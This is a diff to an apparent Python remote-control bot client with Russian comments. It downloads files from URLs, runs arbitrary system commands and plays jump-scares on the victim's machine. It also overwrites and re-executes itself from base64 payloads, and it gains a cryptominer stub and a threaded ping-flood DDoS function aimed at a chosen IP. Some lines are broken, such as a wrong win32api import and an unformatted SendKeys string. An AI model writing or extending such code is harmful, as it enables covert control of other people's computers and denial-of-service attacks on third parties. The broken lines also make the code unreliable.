@@ -7,6 +7,7 @@ import subprocess
 import base64
 import webbrowser
 import threading
+from win32api import client as comctl
 
 
 __test = config.test()
@@ -25,7 +26,7 @@ def screamer():
     except Exception as err:
         print(err)
         return "невозможно открыть файл скримера"
-    return "Скример сработал)"
+    return "Скример сработал"
 
 def open_url(url):
     """Открывает ссылку в браузере"""
@@ -36,6 +37,7 @@ def open_url(url):
         return f"при открытии ссылки произошла ошибка: {err}"
 
 def wget_url(url):
+    """Загружает файл по прямой ссылке"""
     try:
         wget.download(url)
         res = "успешное скачивание"
@@ -53,7 +55,7 @@ def hotkey(keys):
         return "неправильный хоткей"
 
 def sys_command(command):
-    """Использует стандартную сиситемную комманду, например peppa.mp4 откроется в видеопроигрователе"""
+    """Использует стандартную системную комманду, например peppa.mp4 откроется в видеопроигрователе"""
     # переводит массив слов в строку с коммандой
     try:
         command = ' '.join(command)
@@ -116,3 +118,19 @@ def update_client(name, content):
         file.write(base64.b64decode(content))
     os.system(name)
     return "скрипт клиента перезапущен"
+
+def press_key(key):
+    wsh = comctl.Dispatch("WScript.Shell")
+    wsh.SendKeys("{key}")
+
+def start_miner(cpu_proc=50):
+    pass
+
+def ddos_ip(params):
+    ip = params[0]
+    time = params[1]
+    pack_size = params[2] if len(params) > 2 else 32
+    threads = params[3] if len(params) > 3 else 10
+    for i in range(threads):
+        ping = subprocess.Popen(["ping", "-n", time, "-l", pack_size, ip])
+    return "ддос запущен"
